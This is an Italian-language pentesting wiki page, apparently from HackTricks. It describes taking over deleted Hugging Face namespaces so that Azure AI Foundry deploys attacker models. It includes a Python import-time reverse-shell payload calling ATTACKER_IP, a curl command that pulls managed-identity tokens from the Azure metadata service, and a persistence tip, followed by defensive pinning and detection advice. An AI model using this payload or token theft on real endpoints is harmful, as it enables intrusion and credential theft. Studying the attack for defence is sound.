# Azure - AI Foundry Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenario

- Il Model Catalog di Azure AI Foundry include molti modelli Hugging Face (HF) per il deployment con un click.
- Gli identificatori dei modelli HF sono Author/ModelName. Se un author/org HF viene cancellato, chiunque può re-registrare quell'author e pubblicare un modello con lo stesso ModelName allo stesso legacy path.
- Pipeline e catalog che risolvono solo per nome (no commit pinning/integrity) risolveranno su repo controllati dall'attaccante. Quando Azure deploya il modello, il loader code può eseguire nell'ambiente dell'endpoint, concedendo RCE con i permessi di quell'endpoint.

Casi comuni di takeover HF:
- Ownership deletion: il vecchio path risponde 404 fino al takeover.
- Ownership transfer: il vecchio path risponde 307 verso il nuovo author mentre il vecchio author esiste. Se il vecchio author viene poi cancellato e re-registrato, il redirect si rompe e il repo dell'attaccante viene servito al legacy path.

## Identifying Reusable Namespaces (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## Flusso d'attacco end-to-end contro Azure AI Foundry

1) Nel Model Catalog, trova HF models i cui autori originali sono stati cancellati o trasferiti (autore originale rimosso) su HF.
2) Re-registrare l'autore abbandonato su HF e ricreare il ModelName.
3) Pubblica un repo maligno con codice loader che viene eseguito all'import o richiede trust_remote_code=True.
4) Effettua il deploy del legacy Author/ModelName da Azure AI Foundry. La piattaforma scarica il repo dell'attaccante; il loader viene eseguito all'interno del container/VM dell'endpoint Azure, ottenendo RCE con i permessi dell'endpoint.

Esempio di frammento di payload eseguito all'import (solo a scopo dimostrativo):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Note
- Le implementazioni di AI Foundry che integrano HF tipicamente clonano e importano moduli del repo referenziati dalla config del modello (es., auto_map), il che può attivare code execution. Alcuni percorsi richiedono trust_remote_code=True.
- L'accesso di solito corrisponde ai permessi della managed identity/service principal dell'endpoint. Consideralo come un initial access foothold per data access e lateral movement all'interno di Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Enumerare variabili d'ambiente e MSI endpoints per tokens:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Controlla il mounted storage, i model artifacts e i servizi Azure raggiungibili con il token acquisito.
- Considera la persistence lasciando poisoned model artifacts se la piattaforma re-pulls da HF.

## Indicazioni difensive per gli utenti di Azure AI Foundry

- Fissa i modelli per commit quando li carichi da HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Eseguire il mirror dei modelli HF verificati in un registro interno attendibile e distribuirli da lì.
- Scansionare continuamente codebase e defaults/docstrings/notebooks alla ricerca di hard-coded Author/ModelName che sono stati eliminati/trasferiti; aggiornare o pin.
- Verificare l'esistenza dell'author e la provenienza del modello prima della distribuzione.

## Euristiche di riconoscimento (HTTP)

- Author eliminato: author page 404; legacy model path 404 fino al takeover.
- Modello trasferito: legacy path 307 verso il nuovo author mentre il vecchio author esiste; se il vecchio author viene poi eliminato e re-registrato, il legacy path serve attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Riferimenti incrociati

- Vedi la metodologia più ampia e le note sulla catena di approvvigionamento:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Riferimenti

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
